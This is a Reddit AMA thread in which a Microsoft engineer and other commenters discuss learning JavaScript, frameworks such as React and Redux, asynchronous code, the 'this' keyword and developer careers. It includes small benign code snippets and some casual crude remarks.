I barely knew any JavaScript when I started my job. My college primarily taught courses in C and Java. However, once you learn once language is it relatively simple to learn a new one. My tip for people who are learning JS now is to a solid understanding of the language before adventuring into frameworks such as jQuery, Angular, or React that have special features added on.
Hi Ben, follow up, I also go to Cal Poly for electrical engineering. a friend of a friend asks if this is the earliest you've been to work;) Also, how would you select internship offers? What goes through your head when making that decision?
Hi zoeey123, I recommend this free online book called [You Don't Know JavaScript](https://github.com/getify/You-Dont-Know-JS) by Kyle Simpson. It dives deep into the core mechanisms of JS and if you internalize the content you should be able to pretty much fully understand how JavaScript works under the hood. If you are a video type of person, [Microsoft Virtual Academy](https://mva.microsoft.com) is a great resource as well! 
Hi BlueEzio, I would try to teach it from a language perspective and get the students ramped up on how to do the basics such as for loops and if else statements before venturing into the more advanced features and frameworks. College students have a wide range of backgrounds so try to figure out what kind of students will be showing up and make the curriculum fit accordingly.
I've actually never heard of Blazer before, but I like wearing them at formal events =)
I meant Blazor.
As a junior/intermediate front end developer... What should I be focusing on right now to maintain/improve my competency/hire-ability in the industry? Thanks!
Not Ben, but... 'parasitic inheritance?'
Hi MusicPants(I really wanted to type musicpants), There are a lot of free quality C#/.net courses on [edx.org](https://www.edx.org/course?search_query=.net) that were written by some of my colleagues. 
TypeScript _is_ JavaScript.
You don’t need to convince anyone about JavaScript, they are going to need it sooner or later. It’s one of the few things in life that are certain: death, taxes and JavaScript.
Do you teach patterns? Which do you think are the most useful to your students’ careers?
How do you feel about Blazor? JS has been fun, but it feels nice to be able to use straight C# for the client and server.
It’s an open source web framework based on compiling razor templates into web assembly . Essentially letting you write c# and razor templates on the front end. It was created as a prototype by Steve Sanderson , famed creator of knockout.js and member of the asp.net team at Microsoft . Steve is an amazing software engineer and an expert in JavaScript, C# and web technologies in general . 
Rollup works very well for libraries or simple setups, and with code splitting in beta it'll also work for more advanced projects
Ah, I just looked it up and it looks like using C# on the web instead of JS. My honest opinion is that JS is so common on the web that it will probably not shift much of development back onto C#. However, it might allow some C# developers to do some web projects that they weren't able to do before. The main reason why I love using JavaScript on the web is that its really fast to develop with and if I were to have to define all my classes and subclasses in C#, it might be annoyed at the rate it would slow me down.
Do you like React?
I love React, it kind of just makes sense and you can learn it in a weekend.
It is also fun to just use JS on the client and server with Node.js, but I can see the advantage of having your entire development stack in C# if you are a C# expert. 
yeah, but it does take convincing when you are talking about migrating a Java/C#/Python/whatever back end to Node. it takes convincing to get people who are used to the old, bad times, to not complain about having to use JavaScript.
When did you first learn to code and what do you rate your experience level (scale of 1 - 7) at the time you started the job at Microsoft?
I would say to just learn enough HTML/CSS to make a simple static web page and then start learning JS. JS is used to interact with your HTML to make your web page dynamic (like making content change when you press a button). React is great because it essentially lets you code in a way that outputs HTML from JavaScript functions.
/u/TS_Wannabe gave good advice, but I'll add to it. In your specific situation using Webpack dev server and hot reload, **you are correct** that the files are essentially in memory being served by the dev server. This is great for development, because it's really fast. For production, you don't use Webpack dev server, you just use Webpack, which will output bundles, and can do lots of other amazing things like inject scripts into an html file, handle your stylesheets, etc. That being said, yeah you should probably start out with the TS compiler or whatever and leave Webpack until you have a more clear need for it. Also, if you look at the source output by Webpack, I promise you it will not help you learn ES6. It is very effective and performant but Webpack is not known for outputting readable code. 
a superset of javascript. A cow is a steak on legs. A steak is not a cow on legs.
Apparently [this](http://www.breck-mckye.com/blog/2014/05/why-i-prefer-parasitic-inheritance/)? There is a saying that goes: "If you can't say something nice, don't say anything at all" So I will shut up about this.
Cool go mustangs! 7:30 is wayyyyy above my usual start time. For internship offers, choose the internship that will lead to the most growth opportunities in the future. Just because you do an internship at one company doesn't mean you need to map out your entire career stemming from that internship. Some stuff that goes through my head: - Will I learn a lot? - Is the company likely to give a full time offer after the internship? - Will I have fun doing the work I will do at the internship? 
So what exactly is happening? Are you seeing an error in the problems tab? One thing that you absolutely must be aware of is that ESLint accepts both JSON and JS configs. If you are using the JSON version, you cannot include comments, as that is not allowed in JSON, and you must use only double quotes and must have quotes on all your keys. If you are using JS and the filename is `.eslintrc.js`, you don't have to worry about that. That being said, your .eslintrc.js (I'm assuming you're using the JS version because you have a quote in there) file is not valid JavaScript. You are missing the opening and closing `{}` braces.
I would recommend that you constantly learn and keep yourself relevant with the latest front end frameworks and tools. You don't need to learn all of the latest frameworks but pick at least one of the more modern ones(like React.js) to learn every few years.
What do you think about web components and Polymer?
It's really more about getting Xamarin Forms to web so that Xamarin apps can run truly anywhere. 
As a current student of JS at college level, with some time in University also, I can expand a little on this. He is absolutely right that the students in college have hugely varying degrees of experience. I have many years experience with programming other languages, but some of my classmates struggle with 1-level material like variables, conditionals, etc. I can say that at least in my experience, teachers often do not focus enough on "what can go *wrong*" and just kind of glide through "what you should do *right*". For example, something as simple as **scope** is crucial for debugging, and I would say 90% of my class gets stuck on issues like these for hours. However, you will lose your audience completely if you focus on debugging, even though it is essential. TL;DR - The best thing you could probably teach any beginner programmer is how to google an issue effectively. If I taught a class, I would spend at least 1 hour on this at some point early on. As we all know, the answers we need are readily available online - but if you don't fully understand a problem, you don't know what to look for or how to interpret the solution. A large part of this is learning to filter out irrelevant or poor solutions, to not learn from bad examples. Thankfully, answer-voting on sites like StackOverflow help weed out bad information.
Hi monsto, Its a bit confusing at first wondering why console.logs don't work as intended but once you understand how callbacks work it starts to make sense. Here is a quick breakdown of how async works: 1. Asynchronous function is called with a callback function 2. Other code in the program runs 3. async operation works and callback fires Make sure that all the code that should be run *after* the async operation is put in the callback function As for good resources, I actually wrote an edX course on asynchronous programming that covers callbacks, events, promises, and network requests: [Asynchronous Programming with JavaScript](https://www.edx.org/course/asynchronous-programming-with-javascript)
I would add: "Why this wheel is bigger than my car?"
Awesome article. Just what I was looking for in order to build our works next project!
Can you make tl;dr for your tl;dr? 😂
When writing a course, its tempting to throw in a bunch material thinking the audience will just pick and choose out of the material. However, an important lesson I learned was keeping your course content concise and cohesive.
Yes. Teach people how to debug, and how to effectively google a solution to their problem. If they can do those two things, they will learn very independently. There are no good programmers who are bad at those two things.
Live life with no regrets, make lasting friendships, do stuff your excited about
I think Microsoft is amazing and i hope to work with you guys one day. What are the chances of a medium level javascript developer?
JavaScript skills in a bubble isn't that entirely useful; other web development skills are also important. I would say if you can look at a website such as facebook or reddit and have a good idea how to implement it from scratch if you had to then you are doing pretty good.
In an AMA like this, to a point, it's ok for you to self-promote. [Linking to your own JS entries on edX](https://www.edx.org/bio/benjamin-lin) would be on-topic and IMO certainly acceptible. 
I’m a novice JavaScriptee and I have a few questions: Can you give a list of JavaScript concepts/features to tackle on? (easy on top then hard concepts on bottom) Also what library is needed to know in the JavaScript world? Thanks. 
Which is funny, because I am trying to learn Javascript through FCC, and reading any description of [this] has just made me more confused.
thanks
How would you go about explaining "this" to a newbie?
Ima complete beginner in programing and I picked JS formy first language. Im doing exercises on FreeCodeCamp. Im strugling with writing programs without looking at tips. And it takes me ages to write anything. I feel very discuradged and kinda dumb. Got any tips?
sorry, dont know much about those
Yeah, I finally got 'this' down, but it was the last of the hard things. Quick, explain 'this' using an analogy that a 5 year old would understand. 'this' is the only concept that I found difficult to do that to.
Its a good resource to learn the basics of HTML, JS and CSS, but with all certifications, its more about the content you learn and how it helps you improve rather than the value of the certificate itself.
'this' should be called 'the object to the left of the dot operator' And then theres the subtlety : the thing to the left of the dot is 'window' in a browser, if nothing is there. Apples.foo() // Apples is 'the thing to the left of the dot' and therefore 'this' bar() //window is 'the thing to the left of the dot' I guess an ELI5 may be like, who owns this bike? If sally called it before you did, this refers to sally.
hmm ill try: `this` is used to find the home where you belong
Sorry. Missed it the first time. The idea seems far away for me too, I would make something unrelated to religion for my portfolio so it's only tied to tech. But apart from that, yeah Firebase is a bit hot at the moment so it could be good for several reasons.
Try these concepts to tackle from easy to hard: -if else -for loops -callbacks -document.getElementById kind of stuff -handling events like onclick, onkeypress, etc. -Promises -Fetch API -Async Await jQuery is a great library to quickly start doing cool things
http://julien.richard-foy.fr/blog/2011/10/30/functional-inheritance-vs-prototypal-inheritance/ this explains it fairly well.
Thank ya
Thank you! :) 
I started off as a program manager intern on the learning team the summer of my junior year in college. I would recommend going to a college that Microsoft recruits from and talking to Microsoft at the career fair. 
I actually think "this" has a built in real world analogy: The word "this". "This" derives it's entire meaning from context. Saying "This is good." without context doesn't mean anything. However, if you are eating pasta and saying "This is good", you are referring to the pasta. At least, that's the metaphor that keeps it straight in my head :D However, the asynchronicity of Javascript is something that I continuously have to keep in mind when I'm designing a solution. I have to start thinking of things as reactions to events as opposed to the next step in a procedure. That can be mind breaking if you have any other programming experience.
Interesting. &gt; Only use Redux if your state becomes too hard to manage with just the standard framework you are using. I am curious, when did you adopt that view? Only in the past 3 months or so have I heard it. I agree with it, but I dont think the sentiment has permeated the JS community yet, erryone is trying to use Redux. &gt; but you should be able to learn it on the job as needed Man, in my experience, you dont get to learn on the job. You either show up and are an amazing ninja, or they tell you to get fucked within a month. Learning on the job? Hah! Next youll tell me there is some sort of on the job training also! Hahahahaha what will they think of next. (Its seriously cut throat in small to mid sized businesses in San Diego at least.)
I started in my senior year of high school with Scheme. My experience level was probably around 2 but I had apparently had some potential in the eyes of the employer. But it depends on what is a 7 and what is a 1.
e4, d4 or g4?
Hi MungoProudFoot, Don't get discouraged! Everything takes time in the beginning. I would recommend to start off small and do simple things like doing simple if else statements and for loops and don't try to line by line copy tutorials that are too difficult to understand.
pawn c4
Hey! I'm not the OP (clearly) but my career went from SysAdmin to Software Developer, and I would really recommend Python, Ruby, or Go (my preference is Python) if you're currently working in the Systems/Operations world.
The creator of Redux mentioned that you might necessarily need it: [Link](https://medium.com/@dan_abramov/you-might-not-need-redux-be46360cf367) 
I am glad you think Microsoft is awesome! Keep your skills up to date and always be learning!
So what if I want an action that updates the state of multiple reducers?
How about a good resource on async? It is driving me nuts as I'm coming from decades of top to bottom thinking.
[I'm sure that's what he meant.](https://mva.microsoft.com/en-us/training-courses/top-10-javascript-questions-17356?l=72Lm5qihD_9705494542)
Do you recommend any books in particular to learn Javascript? 
You can still beat that with an animation 😉
If only it were that simple... function foo() { console.log(this) } myObj = {} myObj.f = foo.bind(myObj) myOtherObj = {} myObj.f.call(myOtherObj) myOtherObj.wack = () =&gt; new Function('x','x()')(foo) myOtherObj.wack.call(myObj) //lost track of this yet? Use your analogy to get me to the line with '//lost track of this yet?' 
If you're doing it via webpack, it's all happening in RAM. TS's API converts to ES6, babel's API converts that to ES5. You should try running TypeScript's compiler in watch mode: `tsc -p . -w` I think you'll find that it gets the job done and is easy to do. Also, you can have multiple tsconfig files. So you can have one for TS to generate ES6 for your perusal and another for TS to generate ES5 for webpack. Then you can remove the extra complexity of babel.
Fastest bugfix Microsoft has ever implemented right there.
Excellent way to build out your platform economic driven business on the cheap! ;)
Do you maybe know what are some good resources other then FreeCodeCamp?
&gt; nchronously, meaning that they get handled on a separate thread and the result is returned once it has completed. This throws off beginners who try to use the result of an pretty sure thats why they made "onreadystatechange" !
d4 is for pussies
Interesting indeed. In my experience, the only people using Redux are working applications where their data gets out of sync. You don't fix what's not broken, ya dig? Companies don't want to re-write their application every time something new comes out, especially if it's a monolithic legacy application that probably needs to be rewritten anyway. If syncing your data and managing state of variables is an issue in an application, those are the people who are looking at Redux for a solution. After all, you don't need a solution for a non-problem. Learning on the job: Early in my career, learning on the job was expected. I didn't know Python at all, learned enough of it over a weekend to actually contribute to a new python project, and even contributed to an open-source framework for Python. Didn't know Javascript beyond a handful of jQuery methods. Wrote complex DNA sequencing stuff in Javascript with the same employer. Didn't know AngularJS before one of my last employers, wrote my first AngularJS app and shipped it on the job. I actually kept up with Angular (latest), and contributed to an open-source Angular UI library. Didn't know D3.js at all, learned it on the job to produce a variety of data visualizations for marketing campaigns, and added a custom interaction to a visualization that was the main feature of a recent release for the application I was working on at the time. It doesn't make sense to hire for one set of specific skills based on your current needss because you're not thinking about your future needs, especially in the Javascript world. If you want people to write cde that lasts for years, not weeks or months, you need people who can pick things up quickly and learn on the job, from actually DOING it. Directions change. Software changes. You don't throw the developer or engineer out with the software (or shouldn't), you hope you hired smart engineers who can figure things out. PS: Job training... I actually had to take a certification course on USING the application that I was hired to build... months after I was hired. Another employer paid for mongoDB training for everyone (maybe it was free, I don't remember). 
Thank you
Thanks!
For lack of better words :) 
Thanks!
Thanks!
You would use an 'effect' in Rematch. Here's an example :) https://codesandbox.io/s/pyooxkz15q
I wrote a course on async programming that covers callbacks, Promises and network requests. Link: [Asynchronous Programming with JavaScript](https://www.edx.org/course/asynchronous-programming-with-javascript)
kings gambit 
Thanks
I have been hired for JS roles 2X where I was allowed/encouraged/expected to learn on the job. First role was an "implementation engineer" at a software startup, second was/is my current role as a ui dev. I'm still learning Angular and TypeScript and some more general JS application type stuff. I live in Indiana, USA, if that matters.. 
Not sure about this... in this case would be hard to explore different (and possibly better) approach to solve a given problem. That said i think you’ve hit a good point about having a sort of feedback about the chosen approach.
&gt; Have I been hosting a public unsecure MongoDB? The database was running on my local machine, which is connected to internet. Could someone possibly access my machine through it etc? If they are on your local network, yes. *If you aren't port forwarding (which no ISP likes) then no*, no one can access your local db directly aside from what's connected to your home wifi. &gt; Should I be concerned that someone has possibly hacked my system etc? Honestly, no. &gt; What can a hacker gain from such an access? 10/10 times, a hacker gains access to w/e you gave them access to. If you download a keylogger, then they know what you are typing. If you download some remote access software, then can have full control over your machine if you are logged in as an admin. In general, just never download or open an executable from sources you don't trust. Never use random .dylib, .lib, .dlls w/o source code posted on random forums. Could a hacker access the other files on my system too? Theoretically, yes. --- When moving to a real server. Read up on firewalls, and how to enable them and allow connections only from trusted IPs and only give them access to the Port your db is listening on. Also, keep your database on a completely separate machine from your application, this helps to keep your db IPs from getting out as they shouldn't be publically accessible, meaning that I should not, under any circumstance, be able to type the following... mongo --host [your db ip addr]:27017 ...from my own machine and connect to your database w/ or w/o access to anything. This is how nearly all mongo databases have been hacked. Some random dude with mongo client on their machine and remote into your db just because you decided to allow your db to be publically accessible (which is typically the result of people spinning up their client facing site, app, and db all on the same machine), didn't bother to put up a firewall, or enable auth.
It's pretty similar to Vuex
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [getify/You-Dont-Know-JS/.../**README.md** (master → 6f51ed6)](https://github.com/getify/You-Dont-Know-JS/blob/6f51ed6746300f51bc6c930c080b8a7426b7629b/async%20%26%20performance/README.md) ---- [^delete](https://www.reddit.com/message/compose/?to=GitHubPermalinkBot&amp;subject=deletion&amp;message=Delete reply dulxq2j.)
 Partially edited from this stack overflow link: https://stackoverflow.com/questions/3552461/how-to-format-a-javascript-date function formatDate(date) { var monthNames = [ "January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December" ]; var day = date.getDate(); var monthIndex = date.getMonth(); var year = date.getFullYear(); var time = date.getHours(); var seconds = date.getSeconds(); return monthNames[monthIndex] + ' ' + day + ' at ' + time + ':' + seconds; } console.log(formatDate(new Date("2018-02-21T13:53:31.333Z"))); 
I mean, sure. This is a confusing example. Doing weird things with code will always result in code that is difficult to explain to someone new to Javascript. If this was presented to a Javascript noob as a teaching too, I'd question that teacher's methods. I also don't know that completely understanding this example is _useful_ for someone new to JS. But if the goal is to demonstrate that "this" can be super weird and have it's meaning super obscured, then mission successful. It has been my experience that relating "this" to the English definition of "this" gets you pretty far though.
Very interesting, I do like the reduced boilerplate. How do more complex reducers work, any example of backend async calls? Or more complex states?
Yep... that’s a thing that I see happening a lot. Anyway I don’t think that “i didn’t invent that one” stands as excuse, since you’re including it in your codebase. Any real experience you can share?
Not Ben (Sorry! Perhaps he'll have an even better answer..), but.. For a newbie, `this` can take on 3 values: 1. the global/window context/object 2. the object on which a function is called (calling `this` in the object's function means `this` points to the object) 3. whatever you want with the `bind` method 
You'd have to know the alternatives in depth to determine if your approach is better, or if it's a waste of time.
I have experience with python for backend (previous job) and T-SQL for database development (current job). Why should I learn javascript now? **edit:** Thanks for the answer. I wrote this just before my break and re-reading it now, it sounds a bit more negative than I intended. I guess I was really asking how can I supplement my work now with JS?
Agree. Nonetheless you can still learn a lot (and maybe even more) from a failed attempt. 
Ive done similar things (same tools even!), but on my own, and never while employed. Currently reading and trying to implement ideas from here (youll probably get a kick out of it) : https://ds9a.nl/amazing-dna/ I once got fired for reading too much on the job. MDN, specifically about object creation, a few years ago. I recently got laid off, with 13 other devs, at a company that had built a system so fragile that simple front end UI changes to broke dozens of their sites, and there was no documentation, no training. I was hired there as senior front end dev, and ended up doing everything from AWS configuration to debugging PHP. There was no room for discussion on how to improve the situation either, they were experiencing the gamblers fallacy I believe. In the end, its falling on its own sword. Prior to that, a mediocre advertising agency that was supported by a newspaper that went under. My first programming job was 1999. Between these, Ive been a garbage man, a city worker (parks dept, mowing grass), a liquor store clerk, a pizza delivery guy, an arcade attendant at a mall, a school bus driver, a night stalker at petsmart. All the while, when Id get home, experimenting with php, or mysql, or some weird thing like brainfuck. I guess Im always just surprised that someone can get a good dev job at 20, while not really having much experience or a huge amount of skill yet. Ive been trying for 20 years now, while constantly learning, and got basically nowhere. I put my resume out daily, and rarely get calls back. I believe many of the places hiring, arent, in fact. I keep hearing how theres a shortage of skilled devs, yet here I sit on a wednesday, unemployed, writing python plugins for blender. Your experience has been largely positive. Mine has not. //sorry to dump, got no one to dump on
... so in other words... it’s not that easy determine what’s really a waste of time imho
W3schools is pretty useful for beginners. I even refer to it from time to time when I forget the syntax of things.
See, thats the thing here : the answer stares you in the face, and this is quite a simple puzzle. It depends on you knowing an arcane tidbit (I love these) : the new Function has this set to window, no matter the context. While contrived, Im 100% sure that this kind of thing is used in some useful way somewhere in javascript. With async, you can get out of callback hell a number of ways, and explain async easily to a noob. Not so with this.
Since this is an AMA am just gonna go for it. Can i join your team?
Something you’ve built (or tried to) to understand its working... or something you had hard time understanding
Why does your node SDK for Azure suck ass, and never get updated? No one responds to github issues?? MS doesnt seem to be supporting JS devs. 
Hi Ben! What advice would give people to improve their hire-ability in web development who are switching career (in early 30s, no internship) right after graduating with computer science degree? What would be necessary to get a first job without hassle and grow their career from there? Any specific frameworks? How advanced projects on resume should be?
If you are fine with vanilla JavaScript, there is nothing stopping you from using it. However, Typescript is available for people who need a bit more features. 
My advice would be to leverage the contacts you made in college, utilize campus resources and to brush up your resume and linkedIn profile so you can get noticed by employers. There definitely is a difference between being a good developer and having good interview skills so make sure to practice interviewing so you can nail your interviews once they come. The best projects on your resume are the ones you can explain in depth and discuss why you made certain design decisions and etc.
My question is about the state of JavaScript ES6: 1) How fast do you think it will be before this becomes the standard? Although I like the new features (Async, Await, Arrow functions) I still can't get my head around it and don't use it as much. 
Hi Benjamin. Does Microsoft ever hire self-taught developers? 
Does it interact well with the Redux devtools in Chrome? It seems to have a dependency on Redux, so I assume that's what you're using under the hood. Is it possible to convert an application from Redux to Remach in parts (such as replacing reducers in a combineReducer statement with Rematch equivalents one at a time)?
Thanks, What about in the database/data world. Is there a way I can leverage data analysis with JS? 
Redux devtools are built in. You can convert a project from Redux to Rematch since "dispatch" can be used in both the normal way, and the action creator way. Just start with init: ``` const store = init({ models: // rematch models here redux: { reducers: // add your redux reducers here } }) ``` See https://rematch.gitbooks.io/rematch/docs/reduxApi.html for more.
1) a lot of modern browsers already support a lot of ES6 features The new features are meant to help you do things easier. If you don't find yourself needing those features than there is no reason to push yourself to use them. You can get by without using Async Await if you use Promises and Arrow functions are just a faster way of writing function(){ ... }
yes
Yep, that sometimes happen. What particular framework was the source of your frustration?
Awesome stuff, great to hear! I'm a Tech Evangelist based out of Philadelphia, and we work closely with the MSPs. Keep up the awesome work. 
You can interact with databases using Node.js ORM libraries and D3.js is a cool data visualization library if you want to display your data in a neat way.
Oh... Well.. I had to rebuild the higher order array methods for a job interview. The task was to implement forEach, map, filter, reduce without using any of those in any of the implementations. I've also built quick little component/view rendering libraries (kinda like a super small React implementation) to kind of get an idea of how those work. I code nearly everything I do as side projects in just pure vanilla js aw wll; I almost never use frameworks/libraries.
I also work at Microsoft, as a Tech Evangelist, and our team does quite a bit with JavaScript (both front and back-end). I think for most people at just about any company, if you can clearly convey that you are knowledgeable about the language, highlight projects you've worked on, blog, etc., it can go a long way towards finding a role at a company, regardless of how proficient you may be at one particular language. Also, the ability to pick up new skills (frameworks!) quickly, is a huge plus. 
Absolutely. I work as a Tech Evangelist, and many (most?) on our team are self taught. Your ability to convey your knowledge (videos, blogs, speaking engagements, community) are what I think really allow most developers to stand out in the crowd. 
Benjamin Lin c/o /u/MicrosoftLearning, we thank you for taking the time to do this AMA, I believe it went over very well! Now maybe we can get your colleague /u/bterlson_ to host one ;)
Oh hey! 👋 I'm from Tamil Nadu, India. We have couple of MSPs in our community as well. We recently got initiated and we're giving it our best. 💪 Hope you guys are doing great too. We update our stuff on FB at fb.com/micvitvellore and on Twitter at twitter.com/mstcvit If you have any links, let me know!
For someone prepping to do tech assessments for data structures and algorithms; would you recommend using JavaScript over Python or another alternative? Most of my background is JS but most resources tend to skew to another language (e.g. Python, Java).
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [MithrilJS/mithril.js/.../**polyfill.js** (next → 560eade)](https://github.com/MithrilJS/mithril.js/blob/560eade284a16d58cd28cb0b3572e5e35446bd9f/promise/polyfill.js) ---- [^delete](https://www.reddit.com/message/compose/?to=GitHubPermalinkBot&amp;subject=deletion&amp;message=Delete reply dum2ri6.)
Why are the new, bad times necessarily better than the old? I would be worried if it *didn't* take some convincing...
I would say Python, Java or C++ for tech interview type problems over JavaScript since some interviewers might not know JavaScript and JavaScript has some built in methods that the interviewers probably want you to do manually.
16 should be fully backwards compatible with 15.5. Upgrading from 15.x to 15.5 is relatively painless, the biggest pain in the ass is PropTypes. If you're using dependencies that haven't migrated to 15.5 yet, it's means they probably aren't supported anymore and you need to consider other options. If you're basing your decisions on what Facebook uses, then you make bad decisions. 16 is production ready. That's all you should care about. What they use is totally irrelevant. Plus, I'm fairly certain that I've read in the past that Facebook/IG/WhatsApp does not even follow React versioning directly and uses more experimental features. But, I could just be talking out of my ass on that.
How's that going to help. Recruiters have absolutely no idea 99% of the time and don't even know the difference between Java and JavaScript and think html5 is coding 0_o
What do you think of Typescript? Do you think it's will stay, or even overtake Vanilla in the dev environment? When do you decide to implement within projects? My experience of it is that it consistently delivers higher quality code from all team members. 
Do you normally capitalise random words mid sentence? (the title of this thread) 
Well, it's a bit silly, when someone use react, to do simple DOM manipulation. When all he needs is `element.innerHTML` or `element.appendChild`. Also, when someone import whole jQuery, only for ajax calls. Or for `querySelectorAll` replacement. When size of your framework/libraries is 10 times bigger than your own code - then... it's something wrong.
https://github.com/mateuszjanusz/picsort
Its kind of like putting the training wheels back on JavaScript
I thought JS used only one thread with different queues (Macro/Micro). Can anyone clarify this? Thanks!
As someone who hasn't had the "aha!" Moment yet, what was it for you?
We took care of prop-types in our migration to 15.3. It's our dependancies that will break. Specifically https://github.com/akiran/react-highlight/issues/39#issuecomment-334898100
Yes, and in fact, Facebook is generally _ahead_ of the public versions of React. The React team is responsible for ensuring that all of Facebook's 50K React components are compatible with the current version of React, and they will frequently roll out alpha versions of React to a subset of Facebook's users. React 16 is a must-have upgrade for a variety of reasons, including error handling, more options for render method return values, better stack traces, and much much more. For more info, see: - [React Fiber for the Rest Of Us](http://www.benmvp.com/slides/2017/reactboston/fiber.html#/) - [What's New in React 16?](https://www.robinwieruch.de/what-is-new-in-react-16/) - The announcements for [React 16.0](https://reactjs.org/blog/2017/09/26/react-v16.0.html) and [React 16.2](https://reactjs.org/blog/2017/11/28/react-v16.2.0-fragment-support.html) - Lin Clark's excellent [A Cartoon Intro to Fiber](https://youtu.be/ZCuYPiUIONs) talk
Looks like there are some fixes/hacks in there and their package.json requires 15.5. 
JS operates on one thread, but the network request is made by an API that operates on a different thread that lives on the browser
For what exactly?
Pop quiz hotshot: How would you go about selecting only half of the text of this comment via JS?
How do you handle hate against JavaScript? I personally love JavaScript but I also sometimes understand why people don’t like it.
&gt;Any tips on convincing / converting / easing up their mindset so they don't constantly fight with your instructions? Assuming you mean using JS/Node on a server, I'd say the biggest pros are: * V8 today is much faster/more stable than years past. It'll never match compiled on performance, but it's faster than Python and PHP in most cases. * you don't have to program your views twice like the old days of jQuery * you have more control over what processing gets done on the client side * Being able to import/program crucial functions one time and use multiple times. Think simulations, hashing algorithms, or form input validation. * Lots of languages can do it, but Node's streaming is pretty great. For example, you can have a user start downloading a PDF while Node is still generating it! * ESLint+Prettier+Babel makes code so much more readable and maintainable than the average low-level dev's code. * TypeScript
My github is Kevinkid, please let me know What do you think of my current skill set.
Well, I agree with the general feeling of your comment, but I don't believe it's possible to establish any such threshold... I guess it's more a judgement call... in the examples you've provided I agree with you that probably the framework's benefits do not pay for its cost.
How angular actually uses js.
He/she is probably referring to your Aha moment with Angular and how it works...
Your TL;DR is literally as long as the main body of your post, lol.
Hi /u/aptitudes, For javascript help, please visit /r/LearnJavascript. Thank you!
Thanks for taking the time to write a such great answer... I'll take the time to read it carefully. Let me just clarify that the video linked to the original post is not the final version of my polyfill. Tomorrow I'm going to publish a second video. There are five videos in total; the whole series will be published as soon as this Sunday. I'm sure all the other polyfills out there are far better than mine in terms of performance, features, weight. I've tried to optimise mine for ease of readability... I hope you'll take the time to give another look at my code when it'll be completed. 
A little late to the party, but I just came across info that parameterized string replacements in tge RegEx object in at least Firefox is deprecated. Are these still useable to get those values? From what I could tell, it was on the Object, not the instance. Also, MSFT has not deprecated these on their RegEx object from what I can tell.
One of the strongest use cases for Javascript (over a more structured language) is its sheer speed-to-deployment. With a basic knowledge of Node.js and some decent googling skills, you can easily deploy in a weekend what would normally take weeks (or, in the case of mobile apps, *months*) in the other languages. They may not be operating at 100% levels of bleeding-edge performance... but let's face it, performance means nothing for an app that no one's using.
Well, nothing being in black and white, there are advantages and disadvantages. However, I don't think there is much question that the tools available to web developers have significantly advanced in the last 10 years. And in the world of JavaScript specifically, the language has progressed from a "toy" language built in 10 days and maintained by literally a single person to a vibrant ecosystem with standards and specs. That's a win, if you ask me. You don't have to like having lots of options, but it's better than having none.
Yeah, I just replied. The tldr is "understanding how you would be able to make your own basic version of the framework."
You're allowed to use more than one language, y'know.
What do you jerk off to in general? Favorite website? Or you’re too busy with work?
Hi Benjamin, based on some experiments we found Cache Storage is faster than IndexedDB in production in Service Worker context. Any thoughts why? Shared more details at https://twitter.com/Nithanaroy/status/966437493254975488
It's supposed to stop after playing through, right? Does `audio.play(audio)` return a truthy value? This works (using Mac, Chrome): const audio = document.createElement('AUDIO'); audio.src = 'http://www.kepu.net.cn/english/animal/concert/wav/cnt109.wav'; audio.onended = () =&gt; alert(); audio.play();
You can put 4 spaces before each line to keep your code's formatting. I'm not so sure about this fragment: `audio.play(audio)` Does .play really require an argument of audio as well? Seems odd
What is your opinion of ES6 Classes? I feel like they are just a crutch for people who are stuck in OOP and don't want to learn anything `new`.
&gt;Yes, and in fact, Facebook is generally _ahead_ of the public versions of React. The React team is responsible for ensuring that all of Facebook's 50K React components are compatible with the current version of React, and they will frequently roll out alpha versions of React to a subset of Facebook's users. Do you have any sources for this? I totally believe you, because I said the same thing, but I don't remember where I saw it and this sounds so much more interesting than I remember.
Realistically, you should be able to do whatever the interviewer asks, and if you can't you should be able to Google it. But if I was hiring a junior front-end dev I'd expect the following JavaScript skills: * Create a DOM element * Change the content or attributes of an element * Find an element or collection of elements in the DOM, e.g. by CSS selectors * Load data from some other source (e.g. back-end app, RESTful API...) * Put all of these together to build dynamic content. If any of your answers to these include the word "jQuery," then thanks for your time, we'll be in touch. This is before I even ask about React or Angular or whatever framework my fictional company uses (it'll be in the advert). And I put a lot more trust in a coder's understanding of the concepts than their ability to memorise syntax and reproduce it under pressure. But this is the bare minimum I'd expect a front-end dev to just _know_.
https://www.youtube.com/watch?v=w-7RQ46RgxU this guy is super good in my opnion. Im currently during this tutorial and I find he explains everything super well.
&gt; learn it in a weekend. If you have prior Javascript/node experience, I assume :)
Thanks for the breakdown!
Your `array` is defined outside of the `range` function, so every time you call it, it adds on to the previous call(s). Because you're logging a `range` call before using it again in `sum`, you're getting a double-range in `sum`. Fix it by putting `array` inside of `range` so each `range` call gets its own, empty array to populate and return.
$(".id-t2_a6yih").text("jQuery bigot.");
Gah. Makes total sense. Thanks!
document.querySelector(".id-t2_lbphbna").textContent = "Neanderthal";
The angular parts are from an open source project that I'm trying to incorporate into the react site I wrote.
&gt; If any of your answers to these include the word "jQuery," then thanks for your time, we'll be in touch. That's right. We'll be in touch because we're not a startup and have a large, established codebase with judicious use of jquery that we'll need you to help maintain. We appreciate your experience with this technology.
What would you look for in a senior JavaScript engineer
Https cried many tears today (╯°□°）╯︵ ┻━┻)
Thanks, we'll be in touch.
No you wont. I'm retired. Go back to work slave driver. 
Cuz IE9.
Because copied from SO
Alright, a less flippant answer since you took the time. The four sub-tasks I asked for are all performed by a single function each, and in every case the relevant function is supported in every major browser: * `const paragraph = document.createElement("p");` * `paragraph.textContent = "jQuery sucks lol";` * `document.querySelector()` or `.querySelectorAll()`, or even `.getElementsByTagName` or `.getElementById` etc. Lots of solutions here. * `XMLHttpRequest` for every browser, `fetch` for current gen That's your stdlib right there, no imports or requires, no script tags, no library downloads. They've worked in every browser for the last decade. If you've done this kind of thing in jQuery, that's impressive. I've done a fair bit of jQuery but I've never been paid for it, so I'm definitely not an expert in it. In fact I could only do 3 out of those 4 things in jQuery from memory. But OP wasn't asking about a jQuery interview, he was asking about a JavaScript interview. If I had asked a candidate these questions and the answer had started with `import React from "react";` then thanks for your time, we'll be in touch. React is JavaScript, jQuery is JavaScript, but I'm only here to test your "strong JavaScript skills" (quoting OP), not your knowledge of these libraries, however strong it might be.
